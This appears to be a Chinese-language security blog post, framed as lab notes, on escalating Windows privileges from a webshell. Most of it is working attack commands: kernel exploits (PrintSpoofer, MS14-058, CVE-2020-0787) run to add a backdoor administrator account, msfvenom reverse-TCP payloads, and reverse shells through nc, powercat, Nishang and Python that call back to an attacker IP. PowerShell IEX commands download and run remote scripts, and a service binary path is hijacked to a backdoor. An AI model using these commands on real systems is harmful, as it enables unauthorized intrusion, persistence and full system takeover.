RID是指相对ID（RID）、是SA所指派的一个惟一的、顺序的编号、代表一个安全主体（比如一个用户、计算机或组）</li></ol><p><a href="https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers[">安全标识符</a></p><h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2><p>提权是指把普通用户的权限进行提升，通过是各种漏洞提升webshell权限以夺得服务器权限。</p><p>webshell的权限根据不同的中间件权限也有所不同，如没经过特殊设置，webshell的权限是继承该中间件的权限。</p><p>webshell的默认权限</p><p> 从图中可以看到webshell的权限是iis_users组</p><p><img src="/2021/12/28/day37/image-20220208115236511.png" alt="image-20220208115236511"></p><h3 id="提权常用方法"><a href="#提权常用方法" class="headerlink" title="提权常用方法"></a>提权常用方法</h3><ul><li>漏洞提权</li><li>windwos特性提权</li><li>第三方组件提权</li><li>数据库提权</li><li>ftp提权</li></ul><h3 id="提权常用命令"><a href="#提权常用命令" class="headerlink" title="提权常用命令"></a>提权常用命令</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr OS #获取系统版本信息 systeminfo&amp;&amp;wmic product get name,version&amp;&amp;wmic nic where PhysicalAdapter=True get MACAddress,Name&amp;&amp;wmic NICCONFIG WHERE IPEnabled=true GET IPAddress #检测系统软件包hostname #获取主机名称 whoami /all #获取当前用户的详细信息 whoami /priv #显示当前用户的安全特权 net start #查看服务 quser or query user #获取在线用户 netstat -ano | findstr 3389 #获取rdp连接来源IP dir c:\programdata\ #分析安装杀软 wmic qfe get Caption,Description,HotFixID,InstalledOn #列出已安装的补丁 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber #获取远程端口 tasklist /svc | find "TermService" #获取服务pidnetstat -ano |find "pid" #获取远程端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windows提权辅助脚本"><a href="#windows提权辅助脚本" class="headerlink" title="windows提权辅助脚本"></a>windows提权辅助脚本</h3><p>检测系统补丁脚本 <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester">https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester</a></p><p>查看补丁 <a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p>windows 内核提权exp <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p>在线提权利用查询 <a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><p> <a href="http://bugs.hacking8.com/tiquan/">提权辅助网页 (hacking8.com)</a></p><h3 id="windows提权流程"><a href="#windows提权流程" class="headerlink" title="windows提权流程"></a>windows提权流程</h3><p>能够执行cmd命令-&gt;是否打补丁-&gt;补丁对应exp-&gt;获取服务器权限</p><p>执行命令的时候 aspx-&gt;php和asp</p><p>如果管理员删除服务器组件 wscript.shell 无法在asp执行cmd命令，这个时候可以使用aspx的后门查看是否有权限执行cmd命令</p><h3 id="补丁查询"><a href="#补丁查询" class="headerlink" title="补丁查询"></a>补丁查询</h3><h4 id="hacking8在线查询补丁"><a href="#hacking8在线查询补丁" class="headerlink" title="hacking8在线查询补丁"></a>hacking8在线查询补丁</h4><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; c:\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220208121157795.png" alt="image-20220208121157795"></p><h4 id="wesng查询补丁"><a href="#wesng查询补丁" class="headerlink" title="wesng查询补丁"></a>wesng查询补丁</h4><p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><pre class="line-numbers language-none"><code class="language-none">python wes.py --update-wes #更新pip3 install chardet #下载包 python wes.py c:\sys.txt #检测补丁<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220208122410524.png" alt="image-20220208122410524"></p><h4 id="WindowsVulnScan-查询补丁"><a href="#WindowsVulnScan-查询补丁" class="headerlink" title="WindowsVulnScan 查询补丁"></a>WindowsVulnScan 查询补丁</h4><p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p><p>原理：</p><ol><li><p>搜集CVE与KB的对应关系。首先在微软官网上收集CVE与KB对应的关系，然后存储进数据库中</p></li><li><p>查找特定CVE网上是否有公开的EXP</p></li><li><p>利用powershell脚本收集主机的一些系统版本与KB信息</p></li><li><p>利用系统版本与KB信息搜寻主机上具有存在公开EXP的</p></li></ol><p>使用：</p><p>1.首先运行powershell脚本 KBCollect.ps 收集一些信息 运行后在目录下生成kb.json</p><pre class="line-numbers language-none"><code class="language-none">.\KBCollect.ps1 Set-ExecutionPolicy -Scope CurrentUser remotesigned<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开cmd，运行powershell，将工具中的KBCollect.ps1 拖入发现报错，我们找到方法bypass掉，用上面第二行的命令，之后再次运行KBCollect.ps1 就成功了，我们在当前用户下看到生成了json文件</p><p><img src="/2021/12/28/day37/image-20220208140211715.png" alt="image-20220208140211715"></p><p><img src="/2021/12/28/day37/image-20220208140339958.png" alt="image-20220208140339958"></p><p>2.将运行后产生的 KB.json 文件移动到 cve-check.py 所在的目录</p><p>3.打开kali，监听80端口，将修改后的脚本放到桌面，访问kali ip</p><p><img src="/2021/12/28/day37/image-20220208141256194.png" alt="image-20220208141256194"></p><p>说明此脚本可以访问</p><p>4.在asp中执行命令，执行完成后会在目录生成文件</p><pre class="line-numbers language-none"><code class="language-none">Powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/KBCollect.ps1 ')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220208142455949.png" alt="image-20220208142455949"></p><p>看到生成了kb.json</p><p><img src="/2021/12/28/day37/image-20220208143536980.png" alt="image-20220208143536980"></p><p>将此文件放入工具中</p><p>5.运行工具</p><pre class="line-numbers language-none"><code class="language-none">python cve-check.py -C -f KB.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220208143920886.png" alt="image-20220208143920886"></p><h3 id="查询可写目录或文件"><a href="#查询可写目录或文件" class="headerlink" title="查询可写目录或文件"></a>查询可写目录或文件</h3><p>在确定可以执行cmd命令时，有些服务器会对目录进行权限设置，导致iis_user用户组没有权限对常见的目录进行写入和读取</p><p>这时可以用扫描可写目录脚本对目录进行遍历扫描，得到可写目录 上传或下载 提 权exp 或替换文件 进行利用。</p><p>常见的脚本有</p><ul><li>wt.asp </li><li>net版本的wt.aspx </li></ul><p>wt.asp，红色表示文件可替换 蓝色表示目录可写</p><p><img src="/2021/12/28/day37/image-20220208145408817.png" alt="image-20220208145408817"></p><p><img src="/2021/12/28/day37/image-20220208145443162.png" alt="image-20220208145443162"></p><p>wt.aspx，因为net的权限比 asp大，而且能访问注册表，所以除了常规扫描目录之外，还会读取注册表软件目录进行目录扫描。</p><p><img src="/2021/12/28/day37/image-20220208145651832.png" alt="image-20220208145651832"></p><h2 id="windows常用提权"><a href="#windows常用提权" class="headerlink" title="windows常用提权"></a>windows常用提权</h2><p>通过上面的补丁查询，列出可用的exp，在webshell里使用提权exp对服务器进行提权。</p><h3 id="CVE-2016-3225（MS16-075）提权"><a href="#CVE-2016-3225（MS16-075）提权" class="headerlink" title="CVE-2016-3225（MS16-075）提权"></a>CVE-2016-3225（MS16-075）提权</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块(SMB) 中存在特权提升漏洞。</p><p>成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。</p><p>若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p><p>此更新通过更正 Windows 服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。</p><p>注：烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Windows Vista</li><li>Windows Server 2008</li><li>Windows Server 2008 R2</li><li>Windows Server 2012 </li><li> Windows Server 2012 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows 7</li><li>Windows 8.1</li><li>Windows RT 8.1</li><li>Windows 10</li></ul><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>利用文件</p><p><a href="https://github.com/itm4n/PrintSpoofer">GitHub - itm4n/PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019</a></p><p>下载文件 <a href="https://github.com/uknowsec/JuicyPotato">https://github.com/uknowsec/JuicyPotato</a> 上传到webshell的可执行目录</p><p>我们这里使用PrintSpoofer64.exe</p><p>查询后发现 C:\Windows\debug\WIA\ 目录是可执行的，上传文件到此目录下</p><p><img src="/2021/12/28/day37/image-20220213105556888.png" alt="image-20220213105556888"></p><p>记录下文件路径 C:\Windows\debug\WIA\PrintSpoofer64.exe</p><p>执行完后，权限为系统权限</p><p><img src="/2021/12/28/day37/image-20220213111533168.png" alt="image-20220213111533168"></p><p>如果不在此目录下，为iis组权限</p><p><img src="/2021/12/28/day37/image-20220213111555323.png" alt="image-20220213111555323"></p><p>在cmdshell中提权，-h可查看使用帮助</p><p><img src="/2021/12/28/day37/image-20220213105647042.png" alt="image-20220213105647042"></p><pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net user xiaoshaK 123456 /add "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net localgroup administrators xiaoshaK /add"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "net user xiaoshaK"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220213110232859.png" alt="image-20220213110232859"></p><p>可以看到在管理员组里了</p><p>增加进管理员组后我们就可以连接他的3389</p><pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\PrintSpoofer64.exe -i -c "netstat -ano"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220213110428517.png" alt="image-20220213110428517"></p><p>可以看到3389是开放的，可以使用mstsc连接创建的用户</p><h3 id="CVE-2014-4113-MS14-058-提权"><a href="#CVE-2014-4113-MS14-058-提权" class="headerlink" title="CVE-2014-4113 (MS14-058)提权"></a>CVE-2014-4113 (MS14-058)提权</h3><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>Microsoft Windows下的 win32k.sys是Windows子系统的内核部分，是一个内核模式设备驱动程序，它包含有窗口管理器、后者控制窗口显示和管理屏幕输出等。</p><p>如果Windows内核模式驱动程序不正确地处理内存中的对象，则存在一个特权提升漏洞。成功利用此漏洞的攻击者可以运行内核模式中的任意代码。攻击者随后可安装程序；查看、更改或删除数据；或者创建拥有完全管理权限的新帐户。</p><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>影响所有Windows x64，包括Windows 7 和 Windows Server 2008 R2 及以下版本。</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>上传编译好的exp到webshell提权</p><p>可以看到cmd可执行</p><p>如果此命令不可执行可以在可执行目录下上传cmd</p><p><img src="/2021/12/28/day37/image-20220213112241194.png" alt="image-20220213112241194"></p><p>如果上传出错显示 缺少对象，那是因为服务器上传的文件大小超出了，此时我们选在webshell后门下的远程下载功能，下载远程cmd到本地可执行目录</p><p>上传编译好的exp，执行即可获取系统权限</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\debug\WIA\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220213112700644.png" alt="image-20220213112700644"></p><p><img src="/2021/12/28/day37/image-20220213112920409.png" alt="image-20220213112920409"></p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\debug\WIA\win64.exe "whoami"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220213113006345.png" alt="image-20220213113006345"></p><p>创建管理员用户同上操作</p><h3 id="CVE-2020-0787-提权"><a href="#CVE-2020-0787-提权" class="headerlink" title="CVE-2020-0787 提权"></a><strong>CVE-2020-0787</strong> 提权</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>当Windows Background Intelligent Transfer Service (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。</p><p>要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Windows RT 8.1</li><li>Windows 7</li><li>Windows 10</li><li>Windows 10 Version 1607</li><li>Windows 10 Version 1709</li><li>Windows 10 Version 1803</li><li>Windows 10 Version 1809</li><li>Windows Server 2008</li><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903 </li><li>Windows Server, version 1909 </li></ul><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>此提权不能使用webshell提权，需要登录到系统</p><pre class="line-numbers language-none"><code class="language-none">net user xiaoshaK 123456 /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220213120809168.png" alt="image-20220213120809168"></p><p>建立普通用户，切换用户</p><p>查看权限</p><p><img src="/2021/12/28/day37/image-20220213120936761.png" alt="image-20220213120936761"></p><p>下载<a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">Releases · cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION · GitHub</a>提权exp，上传到系统</p><p><img src="/2021/12/28/day37/image-20220213121055148.png" alt="image-20220213121055148"></p><pre class="line-numbers language-none"><code class="language-none">c:\windows\debug\WIA\BitsArbitraryFileMoveExploit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行，之后弹出cmd，再次查看权限</p><p><img src="/2021/12/28/day37/image-20220213121307122.png" alt="image-20220213121307122"></p><p>看到是系统权限了</p><h2 id="使用meta-split提权"><a href="#使用meta-split提权" class="headerlink" title="使用meta split提权"></a>使用meta split提权</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>kali自带开源漏洞检测工具，msfconsole开启工具</p><p>msf命令</p><pre class="line-numbers language-none"><code class="language-none">ps 列出进程background 把session放置后台sessions 查看会话back 返回主界面shell得到终端search搜索模块show 列模块info 查看模块信息use 使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><strong>1.在kali上生成反向连接的后门</strong>。ip为kali的ip</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f exe &gt;s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215110344460.png" alt="image-20220215110344460"></p><p>在桌面上生成s.exe</p><p><strong>2.将生成的反向连接后门上传到靶机的可执行文件夹下。</strong></p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215110045301.png" alt="image-20220215110045301"></p><p><strong>3.开启msf，使用监听模块监听ip端口。</strong></p><p>ip和端口要生成后门的端口和ip一致，ip可以设置成0.0.0.0，允许任何主机连接入来，但是存在风险。</p><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show optionsset lhost 192.168.0.195 set lport 12345 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215110619540.png" alt="image-20220215110619540"></p><p><img src="/2021/12/28/day37/image-20220215113131032.png" alt="image-20220215113131032"></p><p><strong>4.在webshell执行exe</strong>。执行后会获取一个session</p><p><img src="/2021/12/28/day37/image-20220215113140445.png" alt="image-20220215113140445"></p><p><img src="/2021/12/28/day37/image-20220215113157072.png" alt="image-20220215113157072"></p><p>执行后得到了meterpreter</p><p>help可查看帮助文档</p><p>getuid查看权限，发现权限较低</p><p><img src="/2021/12/28/day37/image-20220215113429296.png" alt="image-20220215113429296"></p><p>查询补丁</p><pre class="line-numbers language-none"><code class="language-none">run post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215115537504.png" alt="image-20220215115537504"></p><pre class="line-numbers language-none"><code class="language-none">background将session1放到后台sessions 1即可再次进入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.进行提权</strong></p><p>可用常规的exp测试，看能否成功提权</p><pre class="line-numbers language-none"><code class="language-none">常见的提权模块ms14_058 内核模式驱动程序中的漏洞可能允许远程执行代码 ms16_016 WebDAV本地提权漏洞(CVE-2016-0051) ms16_032 MS16-032 Secondary Logon Handle 本地提权漏漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者列出可用的exp模块</p><pre class="line-numbers language-none"><code class="language-none">use post/multi/recon/local_exploit_suggester set session 1 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215121254696.png" alt="image-20220215121254696"></p><p>我们这里使用exploit/windows/local/ms16_075_reflection_juicy模块</p><p>查看参数</p><p><img src="/2021/12/28/day37/image-20220215121527483.png" alt="image-20220215121527483"></p><p>这里设置session 为1 运行即可</p><p><img src="/2021/12/28/day37/image-20220215121640194.png" alt="image-20220215121640194"></p><p>运行后查看权限发现是一个系统权限了</p><p><strong>6.权限维持</strong></p><p>ps查看进程</p><p>migrate迁移</p><p><img src="/2021/12/28/day37/image-20220215122106822.png" alt="image-20220215122106822"></p><h2 id="交互shell和非交互shell"><a href="#交互shell和非交互shell" class="headerlink" title="交互shell和非交互shell"></a>交互shell和非交互shell</h2><h3 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h3><p>交互shell就是shell等待你的输入，并且立即执行你提交的命令。</p><p>这种模式被称作交互式是因为shell与用户进行交互。</p><p>这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当签退后，shell也终止了。</p><p>需要进行信息交互，例如输入某个信息，会返回信息，你需要对其输入内容，输入会执行命令。</p><p>cmd 终端、msf反弹后门shell、nc反弹shell，这些都属于交互shell</p><h3 id="非交互shell"><a href="#非交互shell" class="headerlink" title="非交互shell"></a>非交互shell</h3><p>非交互式shell以shell script(非交互)方式执行。</p><p>在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾，shell也就终止了。</p><p><img src="/2021/12/28/day37/image-20220215144716590.png" alt="image-20220215144716590"></p><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>反弹shell提权是使用工具或者脚本，从服务器主动连接攻击者客户端，是从内部向外部通信，所以能穿透防火墙。</p><p>防火墙一般只对进来的流量进行拦截，并不对主动出去的流量进行拦截，所以反弹shell可以逃逸很多的防火墙。</p><p>另外反弹shell是交互shell，通信是交互的，所以能执行的命令更多，而且没有超时限制，可以从受害者的服务器上下载，更多的资料。</p><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><p><strong>在kali监听666</strong></p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>上传nc.exe到靶机可执行文件夹下</strong></p><p><img src="/2021/12/28/day37/image-20220215145644483.png" alt="image-20220215145644483"></p><p><strong>主动连接，在kali上即可得到一个交互式shell</strong></p><pre class="line-numbers language-none"><code class="language-none">/c C:\Windows\debug\WIA\nc.exe -e c:\windows\system32\cmd.exe 192.168.80.134 666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220215145709304.png" alt="image-20220215145709304"></p><p><img src="/2021/12/28/day37/image-20220215145725913.png" alt="image-20220215145725913"></p><h3 id="powershell反弹cmd"><a href="#powershell反弹cmd" class="headerlink" title="powershell反弹cmd"></a>powershell反弹cmd</h3><p>这里使用powercat，是netcat的powershell版本</p><p><strong>kali上把powecat解压</strong></p><p><strong>监听</strong></p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>/*<strong>目标执行</strong></p><pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorh ino/powercat/master/powercat.ps1'); powercat -c 192.168.80.134 -p 777 -e cmd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>github得搭梯子访问，这里我们也可以在kali上搭一个web服务器，让他从服务器上下载也行</p><p>*/</p><p><strong>在kali上的powercat文件夹处开放一个web服务器</strong></p><pre class="line-numbers language-none"><code class="language-none">sudo python -m SimpleHTTPServer 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>在webshell执行命令</strong></p><pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.80.134/powercat.ps1'); powercat -c 192.168.80.134 -p 777 -e cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后即可得到一个交互式shell</p><p><img src="/2021/12/28/day37/image-20220215152911909.png" alt="image-20220215152911909"></p><h3 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h3><p>Nishang(<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell</p><p><strong>Reverse TCP shell</strong></p><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标执行</p><pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke- PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.80.134 -port 888 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者在服务器搭建下载</p><pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.80.134 -port 888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后得到交互shell</p><p><img src="/2021/12/28/day37/image-20220215155742961.png" alt="image-20220215155742961"></p><p><strong>Reverse UDP shell</strong></p><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvup 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标执行</p><pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 192.168.80.134 -port 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后得到交互式shell</p><h3 id="python反弹cmd-shell"><a href="#python反弹cmd-shell" class="headerlink" title="python反弹cmd shell"></a>python反弹cmd shell</h3><p>使用python编写反弹shell，如果目标支持python3可以脚本直接执行即可</p><p>如果遇到杀软或目标机不支持python，可使用生成的exe版本。</p><p><strong>kali监听999端口</strong></p><p><strong>将脚本放到靶机下，用python执行</strong></p><p><img src="/2021/12/28/day37/image-20220216112513542.png" alt="image-20220216112513542"></p><p>得到了交互式shell</p><p><img src="/2021/12/28/day37/image-20220216112544024.png" alt="image-20220216112544024"></p><p>所以此方法可行</p><p>接下来我们尝试在webshell上传exe执行弹shell</p><p>上传到可执行文件夹下</p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行此命令将py文件生成为exe</p><pre class="line-numbers language-none"><code class="language-none">pyinstaller -Fw pycat.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220216113232870.png" alt="image-20220216113232870"></p><p>但是在asp、aspx上传时由于exe太大无法上传</p><p><img src="/2021/12/28/day37/image-20220216112809716.png" alt="image-20220216112809716"></p><p><img src="/2021/12/28/day37/image-20220216112859775.png" alt="image-20220216112859775"></p><p>我们将exe放到kali上，让asp下载进去</p><p><img src="/2021/12/28/day37/image-20220216113838852.png" alt="image-20220216113838852"></p><p><img src="/2021/12/28/day37/image-20220216113853296.png" alt="image-20220216113853296"></p><p>目标执行</p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\pycat.exe --host 192.168.80.134 --port 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到了交互式shell</p><p><img src="/2021/12/28/day37/image-20220216114009541.png" alt="image-20220216114009541"></p><h2 id="windows系统配置错误提权"><a href="#windows系统配置错误提权" class="headerlink" title="windows系统配置错误提权"></a>windows系统配置错误提权</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>Windows在系统启动时，会伴随着一些高权服务启动(windows服务是以system权限运行的)倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如DLL劫持 </p><p>windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。</p><p>windows服务是以system权限运行的，其文件夹、文件和注册表key-value都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。</p><h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>PrivescCheck加载脚本并执行，列出可能存在问题的所有服务</p><p>将脚本放在kali，在文件夹内启动http服务</p><pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/PrivescCheck.ps1'); Invoke-PrivescCheck"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到列出了一些服务</p><p><img src="/2021/12/28/day37/image-20220228124821076.png" alt="image-20220228124821076"></p><p>其中我们发现</p><p><img src="/2021/12/28/day37/image-20220228124951355.png" alt="image-20220228124951355"></p><p>NT AUTHORITY\Authenticated Users 普通用户也能设置文件</p><p>所以我们可以对UsoSvc服务进行修改</p><p>我们将msf的反向连接后门放入</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=666 -f exe &gt;666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220228125412204.png" alt="image-20220228125412204"></p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220228125518637.png" alt="image-20220228125518637"></p><pre class="line-numbers language-none"><code class="language-none">sc query UsoSvcsc stop UsoSvc sc config usosvc binPath= "C:\ProgramData\666.exe" 注意=号后有空格sc start UsoSvc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先查询此服务为running状态，stop后停止。</p><p>此时修改服务路径为刚才的后门路径</p><p>打开msf监听</p><pre class="line-numbers language-none"><code class="language-none">set payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220228130418188.png" alt="image-20220228130418188"></p><p>之后在启动修改后的服务，即可得到session</p><p><img src="/2021/12/28/day37/image-20220301113514316.png" alt="image-20220301113514316"></p><p>权限也为系统权限</p><p>但是session会自动退出我们需要坐下进程迁移</p><pre class="line-numbers language-none"><code class="language-none">show advanced 显示高级权限set AutoRunScript migrate -f 自动迁移进程run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>run后在启动服务，会自动迁移进程，就会稳定得多</p><p><strong>或者</strong></p><p>也可使用Metasploit中的攻击模块 